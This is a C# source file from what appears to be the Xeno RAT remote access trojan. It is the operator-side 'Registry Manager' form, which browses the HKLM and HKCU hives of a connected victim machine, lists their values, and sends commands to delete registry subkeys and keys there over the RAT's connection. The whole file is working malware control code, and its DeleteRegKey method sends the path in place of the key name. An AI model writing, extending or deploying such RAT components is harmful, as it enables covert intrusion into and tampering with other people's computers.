using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace xeno_rat_server.Forms
{
    public partial class Registry_Manager : Form
    {
        private static readonly Dictionary<byte, string> TypeIdentifierReverseMap = new Dictionary<byte, string>
        {
            { 1, "REG_SZ" },
            { 2, "REG_EXPAND_SZ" },
            { 3, "REG_BINARY" },
            { 4, "REG_DWORD" },
            { 5, "REG_MULTI_SZ" },
            { 6, "REG_QWORD" },
            { 7, "Unknown" }
        };

        Node client;
        public Registry_Manager(Node _client)
        {
            client = _client;
            InitializeComponent();
            client.AddTempOnDisconnect(TempOnDisconnect);
            StartAdd();

        }

        /// <summary>
        /// Executes the specified action when the given node is disconnected.
        /// </summary>
        /// <param name="node">The node to be checked for disconnection.</param>
        /// <remarks>
        /// This method checks if the provided <paramref name="node"/> is the same as the client node, and if it is not disposed.
        /// If both conditions are met, it invokes the specified action to close the connection.
        /// </remarks>
        public void TempOnDisconnect(Node node)
        {
            if (node == client)
            {
                if (!this.IsDisposed)
                {
                    this.Invoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }

        /// <summary>
        /// Asynchronously starts the process of adding registry information to the tree view.
        /// </summary>
        /// <remarks>
        /// This method asynchronously retrieves registry information for "HKLM" and "HKCU" hives using the GetRegInfo method, and then populates the tree view with the retrieved information.
        /// The retrieved information for each hive is added as a new TreeNode to the tree view, and then subkeys under each hive are added as child nodes to the respective hive nodes.
        /// The tree view is updated once all the nodes are added.
        /// </remarks>
        /// <exception cref="Exception">Thrown when there is an error retrieving or populating registry information.</exception>
        /// <returns>A Task representing the asynchronous operation.</returns>
        public async Task StartAdd() 
        {
            RegInfo HKLM = await GetRegInfo("HKLM");
            RegInfo HKCU = await GetRegInfo("HKCU");
            TreeNode treeNodeHKCU = new TreeNode("HKCU");
            treeNodeHKCU.Tag = HKCU;
            TreeNode treeNodeHKLM = new TreeNode("HKLM");
            treeNodeHKLM.Tag = HKLM;
            treeView1.BeginUpdate();
            treeView1.Nodes.Add(treeNodeHKCU);
            foreach (string i in HKCU.subKeys) 
            {
                TreeNode temp=treeView1.Nodes[0].Nodes.Add(i);
                temp.Tag = i;
            }
            treeView1.Nodes.Add(treeNodeHKLM);
            foreach (string i in HKLM.subKeys)
            {
                TreeNode temp = treeView1.Nodes[1].Nodes.Add(i);
                temp.Tag = i;
            }
            treeView1.EndUpdate();
        }

        /// <summary>
        /// Retrieves registration information for the specified path.
        /// </summary>
        /// <param name="path">The path for which registration information is to be retrieved.</param>
        /// <returns>The registration information for the specified <paramref name="path"/>.</returns>
        /// <exception cref="ArgumentNullException">Thrown when the <paramref name="path"/> is null.</exception>
        /// <exception cref="InvalidOperationException">Thrown when the operation is invalid for the current state of the object.</exception>
        /// <remarks>
        /// This method sends the specified path to the client using the SendAsync method and then receives a response.
        /// If the response indicates success, it deserializes the received data to obtain the registration information.
        /// If the response indicates failure, it returns null.
        /// </remarks>
        public async Task<RegInfo> GetRegInfo(string path)
        {
            byte[] opcode = new byte[] { 1 };
            byte[] data = Encoding.UTF8.GetBytes(path);
            await client.SendAsync(opcode);
            await client.SendAsync(data);
            bool worked = (await client.ReceiveAsync())[0] == 1;
            if (!worked) 
            {
                return null;
            }
            byte[] SearlizedData = await client.ReceiveAsync();
            return DeserializeRegInfo(SearlizedData);
        }

        /// <summary>
        /// Deletes a registry subkey and returns a boolean indicating whether the operation was successful.
        /// </summary>
        /// <param name="path">The path of the registry subkey to be deleted.</param>
        /// <returns>True if the registry subkey was successfully deleted; otherwise, false.</returns>
        /// <remarks>
        /// This method sends a delete opcode followed by the UTF-8 encoded path to the registry subkey to the client using asynchronous operations.
        /// It then awaits the response from the client and returns a boolean indicating whether the deletion operation was successful.
        /// </remarks>
        public async Task<bool> DeleteRegSubKey(string path) 
        {
            byte[] opcode = new byte[] { 2 };
            byte[] data = Encoding.UTF8.GetBytes(path);
            await client.SendAsync(opcode);
            await client.SendAsync(data);
            bool worked = (await client.ReceiveAsync())[0] == 1;
            return worked;
        }

        /// <summary>
        /// Deletes a registry key at the specified path and key and returns a boolean indicating whether the operation was successful.
        /// </summary>
        /// <param name="path">The path of the registry key to be deleted.</param>
        /// <param name="key">The name of the registry key to be deleted.</param>
        /// <returns>True if the registry key was successfully deleted; otherwise, false.</returns>
        /// <remarks>
        /// This method sends a delete operation request to the server using the specified path and key.
        /// If the operation is successful, it returns true; otherwise, it returns false.
        /// </remarks>
        public async Task<bool> DeleteRegKey(string path, string key)
        {
            byte[] opcode = new byte[] { 3 };
            byte[] byte_path = Encoding.UTF8.GetBytes(path);
            byte[] byte_key = Encoding.UTF8.GetBytes(path);
            await client.SendAsync(opcode);
            await client.SendAsync(byte_path);
            await client.SendAsync(byte_key);
            bool worked = (await client.ReceiveAsync())[0] == 1;
            return worked;
        }

        /// <summary>
        /// Deserializes the byte array data into a RegInfo object.
        /// </summary>
        /// <param name="data">The byte array containing the serialized RegInfo data.</param>
        /// <returns>The deserialized RegInfo object.</returns>
        /// <remarks>
        /// This method deserializes the byte array data into a RegInfo object by reading the data using a BinaryReader and populating the RegInfo properties based on the data read.
        /// It handles various types of registry values such as REG_SZ, REG_EXPAND_SZ, REG_BINARY, REG_DWORD, REG_MULTI_SZ, and REG_QWORD, and populates the RegInfo object with the corresponding values.
        /// </remarks>
        public static RegInfo DeserializeRegInfo(byte[] data)
        {
            RegInfo regInfo = new RegInfo();

            using (MemoryStream memoryStream = new MemoryStream(data))
            using (BinaryReader reader = new BinaryReader(memoryStream))
            {
                regInfo.ContainsSubKeys = reader.ReadBoolean();
                int subKeyCount = reader.ReadInt32();
                regInfo.subKeys = new string[subKeyCount];
                for (int i = 0; i < subKeyCount; i++)
                {
                    regInfo.subKeys[i] = reader.ReadString();
                }
                regInfo.FullPath = reader.ReadString();
                int valueCount = reader.ReadInt32();

                for (int i = 0; i < valueCount; i++)
                {
                    RegValue value = new RegValue();
                    value.KeyName = reader.ReadString();
                    value.FullPath = reader.ReadString();
                    value.Type = TypeIdentifierReverseMap[reader.ReadByte()];

                    byte valueType = reader.ReadByte();
                    switch (valueType)
                    {
                        case 1: // REG_SZ
                            value.Value = reader.ReadString();
                            break;
                        case 2: // REG_EXPAND_SZ
                            value.Value = reader.ReadString();
                            break;
                        case 3: // REG_BINARY
                            int byteArrayLength = reader.ReadInt32();
                            value.Value = reader.ReadBytes(byteArrayLength);
                            break;
                        case 4: // REG_DWORD
                            value.Value = reader.ReadInt32();
                            break;
                        case 5: // REG_MULTI_SZ
                            int stringArrayLength = reader.ReadInt32();
                            string[] stringArray = new string[stringArrayLength];
                            for (int j = 0; j < stringArrayLength; j++)
                            {
                                stringArray[j] = reader.ReadString();
                            }
                            value.Value = stringArray;
                            break;
                        case 6: // REG_QWORD
                            value.Value = reader.ReadInt64();
                            break;
                        default: // Unknown
                            value.Value = null;
                            break;
                    }

                    regInfo.Values.Add(value);
                }
            }

            return regInfo;
        }

        /// <summary>
        /// Handles the BeforeExpand event of the treeView1 control.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">A TreeViewCancelEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method asynchronously retrieves registry information for each node being expanded in the treeView1 control.
        /// It sets the retrieved registry information as the Tag property of each node.
        /// If the retrieved registry information is null, the method continues to the next node.
        /// For each subkey in the retrieved registry information, a new TreeNode is added to the node being expanded, and the subkey is set as the Tag property of the new TreeNode.
        /// </remarks>
        private async void treeView1_BeforeExpand(object sender, TreeViewCancelEventArgs e)
        {
            foreach (TreeNode i in e.Node.Nodes)
            {
                RegInfo reginfo = await GetRegInfo(i.FullPath);
                i.Tag = reginfo;
                if (reginfo == null) continue;
                foreach (string n in reginfo.subKeys) 
                {
                    TreeNode temp =i.Nodes.Add(n);
                    temp.Tag = n;
                }
            }
        }

        /// <summary>
        /// Updates the listView1 based on the selected node in treeView1.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method updates the listView1 based on the selected node in treeView1. It clears the listView1, retrieves the RegInfo associated with the selected node, and populates the listView1 with the values from the RegInfo. The method handles different types of registry values and displays them accordingly in the listView1.
        /// </remarks>
        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            if (treeView1.SelectedNode != null)
            {
                listView1.BeginUpdate();
                listView1.Items.Clear();
                TreeNode clickedNode = treeView1.SelectedNode;
                RegInfo regInfo = clickedNode.Tag as RegInfo;
                if (regInfo == null) return;
                foreach (RegValue i in regInfo.Values) 
                {
                    ListViewItem lvi = new ListViewItem();
                    lvi.Tag = i;
                    lvi.Text = i.KeyName;
                    if (i.Type == "REG_SZ" || i.Type == "REG_EXPAND_SZ")
                    {
                        lvi.SubItems.Add(i.Value.ToString());
                    }
                    else if (i.Type == "REG_BINARY")
                    {
                        lvi.SubItems.Add(BitConverter.ToString((byte[])i.Value));
                    }
                    else if (i.Type == "REG_MULTI_SZ") 
                    {
                        lvi.SubItems.Add(string.Join(" ", (string[])i.Value));
                    }
                    else
                    {
                        lvi.SubItems.Add(i.Value.ToString());
                    }
                    lvi.SubItems.Add(i.Type);
                    listView1.Items.Add(lvi);
                }
                listView1.EndUpdate();
                textBox1.Text = clickedNode.FullPath;
            }
        }

        /// <summary>
        /// Occurs when the selected index of the ListView changes.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Clears the text in textBox1, clears the items in listView1, clears the nodes in treeView1, and then starts the asynchronous operation StartAdd().
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method clears the text in textBox1, the items in listView1, and the nodes in treeView1 to prepare for the asynchronous operation StartAdd().
        /// It then awaits the completion of StartAdd() to continue with further operations.
        /// </remarks>
        private async void button1_Click(object sender, EventArgs e)
        {
            textBox1.Text = string.Empty;
            listView1.Items.Clear();
            treeView1.Nodes.Clear();
            await StartAdd();

        }

        /// <summary>
        /// Event handler for the Click event of the treeView1 control.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        private void treeView1_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// Handles the event when a node in the tree view is clicked with the mouse.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">A TreeNodeMouseClickEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method checks if the right mouse button is clicked and, if so, creates a context menu with options related to the clicked node.
        /// If an exception occurs during the process, a message box displaying "something went wrong..." is shown.
        /// </remarks>
        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                try
                {
                    //RegInfo procnode = ((RegInfo)e.Node.Tag);
                    //ContextMenuStrip PopupMenu = new ContextMenuStrip();
                    //PopupMenu.Items.Add("Kill " + procnode.Name);
                    //PopupMenu.ItemClicked += new ToolStripItemClickedEventHandler((object _, ToolStripItemClickedEventArgs __) => killPid(procnode.PID));
                    //PopupMenu.Show(Cursor.Position);
                }
                catch
                {
                    MessageBox.Show("something went wrong...");
                }
            }
        }
    }
    public class RegValue
    {
        public string KeyName { get; set; }
        public string FullPath { get; set; }
        public string Type { get; set; }
        public object Value { get; set; }
    }
    public class RegInfo
    {
        public bool ContainsSubKeys { get; set; }
        public string[] subKeys { get; set; }
        public string FullPath { get; set; }
        public List<RegValue> Values = new List<RegValue>();
    }
}
